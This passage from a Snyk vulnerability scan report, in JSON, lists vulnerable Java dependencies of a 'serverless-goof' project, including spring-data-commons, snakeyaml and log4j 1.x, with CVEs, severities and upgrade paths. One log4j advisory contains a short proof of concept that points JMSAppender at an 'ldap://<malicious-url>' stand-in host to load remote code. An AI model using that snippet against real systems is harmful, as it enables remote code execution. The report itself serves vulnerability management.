      "exploit": "Proof of Concept",
      "functions": [
        {
          "functionId": {
            "filePath": "org/springframework/data/web/MapDataBinder$MapPropertyAccessor.java",
            "className": "MapDataBinder$MapPropertyAccessor",
            "functionName": "setPropertyValue"
          },
          "version": [
            "[1.10.1,1.13.11)",
            "[2,2.0.6)"
          ]
        }
      ],
      "fixedIn": [
        "1.13.11.RELEASE",
        "2.0.6.RELEASE"
      ],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORKDATA-32219",
      "identifiers": {
        "CWE": [
          "CWE-94"
        ],
        "CVE": [
          "CVE-2018-1273"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-12-29T11:04:20.852452Z",
      "moduleName": "org.springframework.data:spring-data-commons",
      "packageManager": "maven",
      "packageName": "org.springframework.data:spring-data-commons",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-04-16T10:02:15Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a"
        },
        {
          "title": "Pivotal Security Advisory",
          "url": "https://pivotal.io/security/cve-2018-1273"
        },
        {
          "title": "PoC",
          "url": "https://github.com/jas502n/cve-2018-1273"
        },
        {
          "title": "Spring Docs",
          "url": "https://docs.spring.io/spring-data/jpa/docs/current/reference/html/%23core.web.binding"
        },
        {
          "title": "Spring Jira Issue",
          "url": "https://jira.spring.io/browse/DATACMNS-1282"
        }
      ],
      "severity": "critical",
      "socialTrendAlert": false,
      "title": "Arbitrary Code Execution",
      "functions_new": [
        {
          "functionId": {
            "className": "org.springframework.data.web.MapDataBinder$MapPropertyAccessor",
            "functionName": "setPropertyValue"
          },
          "version": [
            "[1.10.1,1.13.11)",
            "[2,2.0.6)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,1.13.11.RELEASE)",
          "[2.0.0.RELEASE,2.0.6.RELEASE)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.springframework.data",
        "artifactId": "spring-data-commons"
      },
      "severityWithCritical": "critical",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.github.derjust:spring-data-dynamodb@4.3.1",
        "org.springframework.data:spring-data-commons@1.12.10.RELEASE"
      ],
      "upgradePath": [
        false,
        "com.github.derjust:spring-data-dynamodb@4.5.7",
        "org.springframework.data:spring-data-commons@1.13.14.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework.data:spring-data-commons",
      "version": "1.12.10.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
      "alternativeIds": [],
      "creationTime": "2018-04-23T09:47:05.526000Z",
      "credit": [
        "Yevhenii Hrushka"
      ],
      "cvssScore": 7.5,
      "description": "## Overview\r\n[org.springframework.data:spring-data-commons](https://github.com/spring-projects/spring-data-commons) is a part of the umbrella Spring Data project that provides shared infrastructure across the Spring Data projects. It contains technology neutral repository interfaces as well as a metadata model for persisting Java classes.\r\n\r\nAffected versions of this package are vulnerable to Denial of Service (DoS) attacks. It contains a property path parser vulnerability caused by unlimited resource allocation. An unauthenticated remote malicious user (or attacker) can issue requests against Spring Data REST endpoints or endpoints using property path parsing which can cause a denial of service (CPU and memory consumption).\r\n\r\n## Details\r\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\r\n\r\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\r\n\r\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\r\n\r\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\r\n\r\nTwo common types of DoS vulnerabilities:\r\n\r\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\r\n\r\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)\r\n\r\n## Remediation\r\nUpgrade `org.springframework.data:spring-data-commons` to versions 1.13.11, 2.0.6 or higher.\r\n \r\n## References\r\n- [Pivotal Security Advisory](https://pivotal.io/security/cve-2018-1274)\r\n- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2018-1274)\r\n- [GitHub Commit](https://github.com/spring-projects/spring-data-commons/commit/371f6590c509c72f8e600f3d05e110941607fbad)",
      "disclosureTime": "2018-04-18T16:29:00Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "org/springframework/data/mapping/PropertyPath.java",
            "className": "PropertyPath",
            "functionName": "create"
          },
          "version": [
            "[, 1.13.11)",
            "[2.0.0, 2.0.6)"
          ]
        }
      ],
      "fixedIn": [
        "1.13.11.RELEASE",
        "2.0.6.RELEASE"
      ],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORKDATA-32231",
      "identifiers": {
        "CWE": [
          "CWE-400"
        ],
        "CVE": [
          "CVE-2018-1274"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-12-14T14:41:18.965250Z",
      "moduleName": "org.springframework.data:spring-data-commons",
      "packageManager": "maven",
      "packageName": "org.springframework.data:spring-data-commons",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-04-26T13:17:39Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-data-commons/commit/371f6590c509c72f8e600f3d05e110941607fbad"
        },
        {
          "title": "NVD",
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-1274"
        },
        {
          "title": "Pivotal Security Advisory",
          "url": "https://pivotal.io/security/cve-2018-1274"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "functions_new": [
        {
          "functionId": {
            "className": "org.springframework.data.mapping.PropertyPath",
            "functionName": "create"
          },
          "version": [
            "[, 1.13.11)",
            "[2.0.0, 2.0.6)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[, 1.13.11.RELEASE)",
          "[2.0.0.RELEASE, 2.0.6.RELEASE)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.springframework.data",
        "artifactId": "spring-data-commons"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.github.derjust:spring-data-dynamodb@4.3.1",
        "org.springframework.data:spring-data-commons@1.12.10.RELEASE"
      ],
      "upgradePath": [
        false,
        "com.github.derjust:spring-data-dynamodb@4.5.7",
        "org.springframework.data:spring-data-commons@1.13.14.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework.data:spring-data-commons",
      "version": "1.12.10.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:L/E:P/RL:T/RC:U",
      "alternativeIds": [],
      "creationTime": "2019-12-12T13:08:53.753033Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 5.4,
      "description": "## Overview\n[org.yaml:snakeyaml](https://code.google.com/p/snakeyaml/source/browse/) is a YAML 1.1 parser and emitter for Java.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). The Alias feature in SnakeYAML 1.18 allows entity expansion during a load operation, a related issue to CVE-2003-1564.\r\n\r\n*Note* While the Maintainer acknowledges the existence of the issue, they believe it should be solved by sanitizing the `inputStream` to the parser\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `org.yaml:snakeyaml` to version 1.26 or higher.\n## References\n- [Bitbucket Commit](https://bitbucket.org/asomov/snakeyaml/commits/da11ddbd91c1f8392ea932b37fa48110fa54ed8c)\n- [Maintainer Report](https://bitbucket.org/asomov/snakeyaml/wiki/Billion%20laughs%20attack)\n- [POC: Bitbucket Issue](https://bitbucket.org/asomov/snakeyaml/issues/377/allow-configuration-for-preventing-billion)\n- [Proof Of Concept](https://bitbucket.org/asomov/snakeyaml/commits/04378d05777d21d114a9cdc24976ad49c8919222)\n",
      "disclosureTime": "2019-12-12T03:28:21Z",
      "exploit": "Proof of Concept",
      "functions": [
        {
          "functionId": {
            "filePath": "org/yaml/snakeyaml/constructor/BaseConstructor.java",
            "className": "BaseConstructor",
            "functionName": "constructMapping2ndStep"
          },
          "version": [
            "[,1.26)"
          ]
        },
        {
          "functionId": {
            "filePath": "org/yaml/snakeyaml/composer/Composer.java",
            "className": "Composer",
            "functionName": "composeNode"
          },
          "version": [
            "[,1.26)"
          ]
        }
      ],
      "fixedIn": [
        "1.26"
      ],
      "id": "SNYK-JAVA-ORGYAML-537645",
      "identifiers": {
        "CWE": [
          "CWE-189"
        ],
        "GHSA": [
          "GHSA-rvwf-54qp-4r6v"
        ],
        "CVE": [
          "CVE-2017-18640"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-09-24T13:25:49.022190Z",
      "moduleName": "org.yaml:snakeyaml",
      "packageManager": "maven",
      "packageName": "org.yaml:snakeyaml",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-12-19T03:28:21Z",
      "references": [
        {
          "title": "Bitbucket Commit",
          "url": "https://bitbucket.org/asomov/snakeyaml/commits/da11ddbd91c1f8392ea932b37fa48110fa54ed8c"
        },
        {
          "title": "Maintainer Report",
          "url": "https://bitbucket.org/asomov/snakeyaml/wiki/Billion%20laughs%20attack"
        },
        {
          "title": "POC: Bitbucket Issue",
          "url": "https://bitbucket.org/asomov/snakeyaml/issues/377/allow-configuration-for-preventing-billion"
        },
        {
          "title": "Proof Of Concept",
          "url": "https://bitbucket.org/asomov/snakeyaml/commits/04378d05777d21d114a9cdc24976ad49c8919222"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "functions_new": [
        {
          "functionId": {
            "className": "org.yaml.snakeyaml.constructor.BaseConstructor",
            "functionName": "constructMapping2ndStep"
          },
          "version": [
            "[,1.26)"
          ]
        },
        {
          "functionId": {
            "className": "org.yaml.snakeyaml.composer.Composer",
            "functionName": "composeNode"
          },
          "version": [
            "[,1.26)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,1.26)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.yaml",
        "artifactId": "snakeyaml"
      },
      "severityWithCritical": "medium",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "org.springframework.cloud:spring-cloud-function-adapter-aws@1.0.0.RC2",
        "org.springframework.boot:spring-boot-starter@2.0.2.RELEASE",
        "org.yaml:snakeyaml@1.19"
      ],
      "upgradePath": [
        false,
        "org.springframework.cloud:spring-cloud-function-adapter-aws@3.0.7.RELEASE",
        "org.springframework.boot:spring-boot-starter@2.3.0.RELEASE",
        "org.yaml:snakeyaml@1.26"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.yaml:snakeyaml",
      "version": "1.19"
    }
  ],
  "ok": false,
  "dependencyCount": 55,
  "org": "harry.kimpel",
  "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.22.1\nignore: {}\npatch: {}\n",
  "isPrivate": true,
  "licensesPolicy": {
    "severities": {},
    "orgLicenseRules": {
      "GPL-2.0": {
        "licenseType": "GPL-2.0",
        "severity": "high",
        "instructions": ""
      },
      "BSD-3-Clause": {
        "licenseType": "BSD-3-Clause",
        "severity": "low",
        "instructions": ""
      }
    }
  },
  "packageManager": "maven",
  "ignoreSettings": null,
  "summary": "91 vulnerable dependency paths",
  "remediation": {
    "unresolved": [
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "alternativeIds": [],
        "creationTime": "2020-03-30T17:22:24.164713Z",
        "credit": [
          "Hanson Char"
        ],
        "cvssScore": 3.7,
        "description": "## Overview\n[commons-codec:commons-codec](https://commons.apache.org/proper/commons-codec) is a package that contains simple encoder and decoders for various formats such as Base64 and Hexadecimal.\n\nAffected versions of this package are vulnerable to Information Exposure. When there is no byte array value that can be encoded into a string the Base32 implementation does not reject it, and instead decodes it into an arbitrary value which can be re-encoded again using the same implementation. This allows for information exposure exploits such as tunneling additional information via seemingly valid base 32 strings.\n## Remediation\nUpgrade `commons-codec:commons-codec` to version 1.13 or higher.\n## References\n- [GitHub Commit](https://github.com/apache/commons-codec/commit/48b615756d1d770091ea3322eefc08011ee8b113)\n- [Jira Issue](https://issues.apache.org/jira/browse/CODEC-134)\n",
        "disclosureTime": "2020-03-30T17:20:23Z",
        "exploit": "Not Defined",
        "functions": [
          {
            "functionId": {
              "filePath": "org/apache/commons/codec/binary/Base64.java",
              "className": "Base64",
              "functionName": "decode"
            },
            "version": [
              "[,1.13)"
            ]
          },
          {
            "functionId": {
              "filePath": "org/apache/commons/codec/binary/Base32.java",
              "className": "Base32",
              "functionName": "decode"
            },
            "version": [
              "[1.5,1.13)"
            ]
          }
        ],
        "fixedIn": [
          "1.13"
        ],
        "id": "SNYK-JAVA-COMMONSCODEC-561518",
        "identifiers": {
          "CWE": [
            "CWE-200"
          ],
          "CVE": []
        },
        "language": "java",
        "malicious": false,
        "modificationTime": "2020-06-12T14:37:04.472432Z",
        "moduleName": "commons-codec:commons-codec",
        "packageManager": "maven",
        "packageName": "commons-codec:commons-codec",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2012-03-03T17:20:25Z",
        "references": [
          {
            "title": "GitHub Commit",
            "url": "https://github.com/apache/commons-codec/commit/48b615756d1d770091ea3322eefc08011ee8b113"
          },
          {
            "title": "Jira Issue",
            "url": "https://issues.apache.org/jira/browse/CODEC-134"
          }
        ],
        "severity": "low",
        "socialTrendAlert": false,
        "title": "Information Exposure",
        "functions_new": [
          {
            "functionId": {
              "className": "org.apache.commons.codec.binary.Base64",
              "functionName": "decode"
            },
            "version": [
              "[,1.13)"
            ]
          },
          {
            "functionId": {
              "className": "org.apache.commons.codec.binary.Base32",
              "functionName": "decode"
            },
            "version": [
              "[1.5,1.13)"
            ]
          }
        ],
        "semver": {
          "vulnerable": [
            "[,1.13)"
          ]
        },
        "mavenModuleName": {
          "groupId": "commons-codec",
          "artifactId": "commons-codec"
        },
        "from": [
          "serverless-goof:todo@1.0-SNAPSHOT",
          "com.amazonaws:aws-java-sdk-dynamodb@1.11.34",
          "com.amazonaws:aws-java-sdk-core@1.11.34",
          "org.apache.httpcomponents:httpclient@4.5.5",
          "commons-codec:commons-codec@1.11"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "commons-codec:commons-codec",
        "version": "1.11",
        "severityWithCritical": "low"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "alternativeIds": [],
        "creationTime": "2021-06-04T15:38:41.700520Z",
        "credit": [
          "Unknown"
        ],
        "cvssScore": 3.7,
        "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Man-in-the-Middle (MitM). Improper validation of certificate with host mismatch in Apache Log4j SMTP appender. This could allow an SMTPS connection to be intercepted by a man-in-the-middle attack which could leak any log messages sent through that appender.\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [GitHub Commit](https://github.com/apache/logging-log4j2/commit/6851b5083ef9610bae320bf07e1f24d2aa08851b)\n- [Jira Issue](https://issues.apache.org/jira/browse/LOG4J2-2819)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/90bc7826c206c256ee9ec6b51318cc1865cc19e9)\n",
        "disclosureTime": "2020-04-27T17:16:14Z",
        "exploit": "Not Defined",
        "functions": [],
        "fixedIn": [],
        "id": "SNYK-JAVA-LOG4J-1300176",
        "identifiers": {
          "CWE": [
            "CWE-297"
          ],
          "GHSA": [
            "GHSA-vwqq-5vrc-xw9h"
          ],
          "CVE": [
            "CVE-2020-9488"
          ]
        },
        "language": "java",
        "malicious": false,
        "modificationTime": "2022-03-27T14:22:09.168396Z",
        "moduleName": "log4j:log4j",
        "packageManager": "maven",
        "packageName": "log4j:log4j",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2020-04-28T17:16:14Z",
        "references": [
          {
            "title": "GitHub Commit",
            "url": "https://github.com/apache/logging-log4j2/commit/6851b5083ef9610bae320bf07e1f24d2aa08851b"
          },
          {
            "title": "Jira Issue",
            "url": "https://issues.apache.org/jira/browse/LOG4J2-2819"
          },
          {
            "title": "Reload4j Fix Commit",
            "url": "https://github.com/qos-ch/reload4j/commit/90bc7826c206c256ee9ec6b51318cc1865cc19e9"
          }
        ],
        "severity": "low",
        "socialTrendAlert": false,
        "title": "Man-in-the-Middle (MitM)",
        "functions_new": [],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "mavenModuleName": {
          "groupId": "log4j",
          "artifactId": "log4j"
        },
        "from": [
          "serverless-goof:todo@1.0-SNAPSHOT",
          "com.amazonaws:aws-lambda-java-log4j@1.0.0",
          "log4j:log4j@1.2.17"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "log4j:log4j",
        "version": "1.2.17",
        "severityWithCritical": "low"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H/E:P",
        "alternativeIds": [],
        "creationTime": "2021-12-13T14:52:40.887231Z",
        "credit": [
          "Unknown"
        ],
        "cvssScore": 6.6,
        "description": "## Overview\n\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution.\n<br /> **Note:** Even though this vulnerability appears to be related to the [log4j 2.x vulnerability](https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2314720), the 1.x branch of the module requires an attacker to have access to modify configurations to be exploitable, which is rarely possible.\r\n\r\nIn order to leverage this vulnerability the following conditions must be met:\r\n\r\n1. The application has enabled `JMSAppender` (or a class that extends `JMSAppender`)\r\n2. The attacker has access to directly modify the `TopicBindingName` or `TopicConnectionFactoryBindingName` configuration variables - which is an unlikely scenario \r\n\r\nIf these conditions are met, log4j 1.x allows a `lookup` feature that does not protect against attacker-controlled LDAP and other JNDI related endpoints. Therefore, an attacker with access to the aforementioned configuration variables is able to execute arbitrary code when loaded from an LDAP server.\r\n\r\n## PoC\r\n\r\n```\r\nimport org.apache.log4j.net.JMSAppender;\r\n// ...\r\nJMSAppender a = new JMSAppender();\r\na.setTopicConnectionFactoryBindingName(\"ldap://<malicious-url>\");\r\n// OR a.setTopicBindingName(\"ldap://<malicious-url>\");\r\na.activateOptions();\r\n```\n\n## Remediation\n\nThere is no fixed version for `log4j:log4j`.\n\n\nlog4j 1.x is End-of-Life, and a fixed version will not be released.\nIf you believe your application meets the conditions mentioned in the advisory, consider upgrading to the latest log4j 2.x version, or block user input from reaching `JMSAppender` configurations.\n\n## References\n\n- [Apache Mail](https://lists.apache.org/thread/0x4zvtq92yggdgvwfgsftqrj4xx5w0nx)\n\n- [GitHub Comment](https://github.com/apache/logging-log4j2/pull/608#issuecomment-991723301)\n\n- [GitHub Discussion](https://github.com/apache/logging-log4j2/pull/608)\n",
        "disclosureTime": "2021-12-10T00:00:00Z",
        "exploit": "Proof of Concept",
        "functions": [],
        "fixedIn": [],
        "id": "SNYK-JAVA-LOG4J-2316893",
        "identifiers": {
          "CWE": [
            "CWE-94"
          ],
          "CVE": [
            "CVE-2021-4104"
          ]
        },
        "language": "java",
        "malicious": false,
        "modificationTime": "2022-02-15T15:25:01.031655Z",
        "moduleName": "log4j:log4j",
        "packageManager": "maven",
        "packageName": "log4j:log4j",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2021-12-13T15:31:00Z",
        "references": [
          {
            "title": "Apache Mail",
            "url": "https://lists.apache.org/thread/0x4zvtq92yggdgvwfgsftqrj4xx5w0nx"
          },
          {
            "title": "GitHub Comment",
            "url": "https://github.com/apache/logging-log4j2/pull/608%23issuecomment-991723301"
          },
          {
            "title": "GitHub Discussion",
            "url": "https://github.com/apache/logging-log4j2/pull/608"
          }
        ],
        "severity": "medium",
        "socialTrendAlert": false,
        "title": "Arbitrary Code Execution",
        "functions_new": [],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "mavenModuleName": {
          "groupId": "log4j",
          "artifactId": "log4j"
        },
        "from": [
          "serverless-goof:todo@1.0-SNAPSHOT",
          "com.amazonaws:aws-lambda-java-log4j@1.0.0",
          "log4j:log4j@1.2.17"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "log4j:log4j",
        "version": "1.2.17",
        "severityWithCritical": "medium"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "alternativeIds": [],
        "creationTime": "2022-01-18T17:06:29.378900Z",
        "credit": [
          "Unknown"
        ],
        "cvssScore": 8.1,
        "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to SQL Injection. By design, the `JDBCAppender` in Log4j 1.2.x accepts an SQL statement as a configuration parameter where the values to be inserted are converters from `PatternLayout`. The message converter, `%m`, is likely to always be included. This allows attackers to manipulate the SQL by entering crafted strings into input fields or headers of an application that are logged allowing unintended SQL queries to be executed.\r\n\r\n*Note:* this issue only affects Log4j 1.x when specifically configured to use the `JDBCAppender`, which is not the default. \r\n\r\nApache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions. Beginning in version 2.0-beta8, the `JDBCAppender` was re-introduced with proper support for parameterized SQL queries and further customization over the columns written to in logs.\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/pt6lh3pbsvxqlwlp4c5l798dv2hkc85y)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/e845f28e7fb0ecbc0fcce383b11179f2650a51a2)\n",
        "disclosureTime": "2022-01-18T17:01:37Z",
        "exploit": "Not Defined",
        "functions": [],
        "fixedIn": [],
        "id": "SNYK-JAVA-LOG4J-2342645",
        "identifiers": {
          "CWE": [
            "CWE-89"
          ],
          "CVE": [
            "CVE-2022-23305"
          ]
        },
        "language": "java",
        "malicious": false,
        "modificationTime": "2022-04-21T15:25:42.244412Z",
        "moduleName": "log4j:log4j",
        "packageManager": "maven",
        "packageName": "log4j:log4j",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2022-01-18T17:13:25Z",
        "references": [
          {
            "title": "Apache Mailing List",
            "url": "https://lists.apache.org/thread/pt6lh3pbsvxqlwlp4c5l798dv2hkc85y"
          },
          {
            "title": "Apache Security Advisory",
            "url": "https://logging.apache.org/log4j/1.2/index.html"
          },
          {
            "title": "Reload4j Fix Commit",
            "url": "https://github.com/qos-ch/reload4j/commit/e845f28e7fb0ecbc0fcce383b11179f2650a51a2"
          }
        ],
        "severity": "high",
        "socialTrendAlert": false,
        "title": "SQL Injection",
        "functions_new": [],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "mavenModuleName": {
          "groupId": "log4j",
          "artifactId": "log4j"
        },
        "from": [
          "serverless-goof:todo@1.0-SNAPSHOT",
          "com.amazonaws:aws-lambda-java-log4j@1.0.0",
          "log4j:log4j@1.2.17"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "log4j:log4j",
        "version": "1.2.17",
        "severityWithCritical": "high"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "alternativeIds": [],
        "creationTime": "2022-01-18T17:08:37.955423Z",
        "credit": [
          "Unknown"
        ],
        "cvssScore": 8.1,
        "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. CVE-2020-9493 identified a deserialization issue that was present in Apache Chainsaw. Prior to Chainsaw V2.0 Chainsaw was a component of Apache Log4j 1.2.x where the same issue exists.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/rg4yyc89vs3dw6kpy3r92xop9loywyhh)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [NVD Information](https://nvd.nist.gov/vuln/detail/CVE-2020-9493)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/64902fe18ce5a5dd40487051a2f6231d9fbbe9b0)\n",
        "disclosureTime": "2022-01-18T17:06:32Z",
        "exploit": "Not Defined",
        "functions": [],
        "fixedIn": [],
        "id": "SNYK-JAVA-LOG4J-2342646",
        "identifiers": {
          "CWE": [
            "CWE-502"
          ],
          "CVE": [
            "CVE-2022-23307"
          ]
        },
        "language": "java",
        "malicious": false,
        "modificationTime": "2022-03-27T14:18:24.241895Z",
        "moduleName": "log4j:log4j",
        "packageManager": "maven",
        "packageName": "log4j:log4j",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2022-01-18T17:13:25Z",
        "references": [
          {
            "title": "Apache Mailing List",
            "url": "https://lists.apache.org/thread/rg4yyc89vs3dw6kpy3r92xop9loywyhh"
          },
          {
            "title": "Apache Security Advisory",
            "url": "https://logging.apache.org/log4j/1.2/index.html"
          },
          {
            "title": "NVD Information",
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-9493"
          },
          {
            "title": "Reload4j Fix Commit",
            "url": "https://github.com/qos-ch/reload4j/commit/64902fe18ce5a5dd40487051a2f6231d9fbbe9b0"
          }
        ],
        "severity": "high",
        "socialTrendAlert": false,
        "title": "Deserialization of Untrusted Data",
        "functions_new": [],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "mavenModuleName": {
          "groupId": "log4j",
          "artifactId": "log4j"
        },
        "from": [
          "serverless-goof:todo@1.0-SNAPSHOT",
          "com.amazonaws:aws-lambda-java-log4j@1.0.0",
          "log4j:log4j@1.2.17"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "log4j:log4j",
        "version": "1.2.17",
        "severityWithCritical": "high"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "alternativeIds": [],
        "creationTime": "2022-01-18T17:25:51.891230Z",
        "credit": [
          "Unknown"
        ],
        "cvssScore": 8.1,
        "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. `JMSSink` in all versions of Log4j 1.x is vulnerable to deserialization of untrusted data when the attacker has write access to the Log4j configuration or if the configuration references an LDAP service the attacker has access to. The attacker can provide a `TopicConnectionFactoryBindingName` configuration causing `JMSSink` to perform `JNDI` requests that result in remote code execution in a similar fashion to [`CVE-2021-4104`](https://security.snyk.io/vuln/SNYK-JAVA-LOG4J-2316893).  \r\n\r\n*Note:* this issue only affects Log4j 1.x when specifically configured to use `JMSSink`, which is not the default.\r\n\r\nApache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java 